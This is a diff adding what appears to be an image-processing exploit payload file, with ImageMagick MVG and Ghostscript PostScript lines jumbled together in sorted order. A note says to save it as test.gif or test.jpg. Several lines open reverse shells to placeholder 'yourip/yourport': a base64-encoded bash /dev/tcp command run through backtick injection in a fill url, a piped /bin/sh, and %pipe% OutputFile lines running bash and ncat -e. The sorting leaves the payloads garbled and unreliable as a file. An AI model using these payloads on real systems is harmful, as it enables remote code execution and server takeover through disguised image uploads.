@@ -1,0 +1,23 @@
+%!PS
+1.
+2.
+3.
+4.
+Note:
+Save as test.gif or test.jpg
+affine 1 0 0 1 0 0
+encoding "UTF-8"
+fill 'url(https://127.0.0.0/oops.jpg?`echo L2Jpbi9iYXNoIC1pID4mIC9kZXYvdGNwL3lvdXJpcC95b3VycG9ydCAwPiYx | base64 -d | bash`"||id " )'
+image Over 0,0 1,1 '|/bin/sh -i > /dev/tcp/yourip/yourport 0<&1 2>&1'
+legal
+mark /OutputFile (%pipe%bash -c 'bash -i >& /dev/tcp/yourip/yourport 0>&1') currentdevice putdeviceprops
+mark /OutputFile (%pipe%ncat yourip yourport -e /bin/sh) currentdevice putdeviceprops
+pop graphic-context
+push graphic-context
+restore
+save
+userdict /setpagedevice undef
+viewbox 0 0 1 1
+viewbox 0 0 640 480
+{ legal } stopped { pop } if
+{ null restore } stopped { pop } if
